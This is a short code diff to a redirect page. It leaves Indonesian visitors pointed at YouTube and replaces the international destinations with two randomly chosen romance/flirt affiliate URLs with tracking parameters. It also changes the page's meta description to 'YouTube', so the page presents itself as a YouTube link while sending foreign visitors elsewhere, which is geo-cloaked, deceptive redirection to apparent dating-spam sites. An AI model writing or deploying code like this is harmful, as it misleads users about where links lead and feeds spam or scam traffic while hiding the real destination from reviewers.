@@ -6,10 +6,8 @@
 const INDONESIA_DESTINATION = "https://www.youtube.com";
 
 const INTERNATIONAL_DESTINATIONS = [
-  "https://mail.adminforge.de/",
-  "https://mailhole.de/",
-  "https://mailhole.de/",
-  "https://mail.cx/"
+  "https://meppmr4.love-romanceflirt.com/lpk2huu?s1=2589775IO&cid=V375249438",
+  "https://meppmr4.emotionaltogetherness.org/lpk2huu?s1=2589775IO&cid=V375249438",
 ];
 
 function pickRandom(items) {
@@ -25,7 +23,7 @@ function htmlResponse(destination) {
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Redirecting</title>
-  <meta name="description" content="Link in bio tool: Everything you are, in one simple link | Linktree">
+  <meta name="description" content="YouTube">
   <meta name="robots" content="noindex, nofollow">
   <script>
     window.location.replace(${safeDestination});
